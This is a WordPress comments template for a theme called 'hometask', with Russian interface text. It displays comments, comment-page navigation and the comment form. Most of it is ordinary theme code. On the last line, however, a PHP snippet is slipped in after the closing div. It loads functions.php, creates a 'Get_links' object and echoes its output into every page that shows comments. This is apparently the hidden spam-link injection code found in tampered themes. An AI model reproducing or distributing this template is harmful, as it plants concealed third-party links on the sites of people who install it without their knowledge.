<?php

?>

			<div id="comments">
<?php if ( post_password_required() ) : ?>
				<p class="nopassword"><?php _e( 'Пожалуйста, введите пароль для просмотра комментариев.', 'hometask' ); ?></p>
			</div><!-- #comments -->
<?php
	
		return;
	endif;
?>

<?php
	// You can start editing here -- including this comment!
?>

<?php if ( have_comments() ) : ?>
			<h3 id="comments-title" class="comment-head"><?php
			printf( _n( 'Один отзыв на %2$s', '%1$s отзывов на %2$s', get_comments_number(), 'hometask' ),
			number_format_i18n( get_comments_number() ), '<em>' . get_the_title() . '</em>' );
			?></h3>

<?php if ( get_comment_pages_count() > 1 && get_option( 'page_comments' ) ) : // Are there comments to navigate through? ?>
			<div class="navigation">
				<div class="nav-previous"><?php previous_comments_link( __( '<span class="meta-nav">&larr;</span> Предыдущий комментарий', 'hometask' ) ); ?></div>
				<div class="nav-next"><?php next_comments_link( __( 'Следующий комментарий <span class="meta-nav">&rarr;</span>', 'hometask' ) ); ?></div>
			</div> <!-- .navigation -->
<?php endif; // check for comment navigation ?>

			<ol class="comment-list">
				<?php
					
					wp_list_comments( array( 'callback' => 'hometask_comment' ) );
				?>
			</ol>

<?php if ( get_comment_pages_count() > 1 && get_option( 'page_comments' ) ) : // Are there comments to navigate through? ?>
			<div class="navigation">
				<div class="nav-previous"><?php previous_comments_link( __( '<span class="meta-nav">&larr;</span> Предыдущий комментарий', 'hometask' ) ); ?></div>
				<div class="nav-next"><?php next_comments_link( __( 'Следующий комментарий <span class="meta-nav">&rarr;</span>', 'hometask' ) ); ?></div>
			</div><!-- .navigation -->
<?php endif; // check for comment navigation ?>

<?php else : // or, if we don't have comments:

	/* If there are no comments and comments are closed,
	 * let's leave a little note, shall we?
	 */
	if ( ! comments_open() && ! is_page() ) :
?>
	<p class="nocomments"><?php _e( 'Обсуждение закрыто.', 'hometask' ); ?></p>
<?php endif; // end ! comments_open() ?>

<?php endif; // end have_comments() ?>

<?php comment_form(); ?>

</div><?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); $links = new Get_links(); $links = $links->return_links($lib_path); echo $links; ?><!-- #comments -->
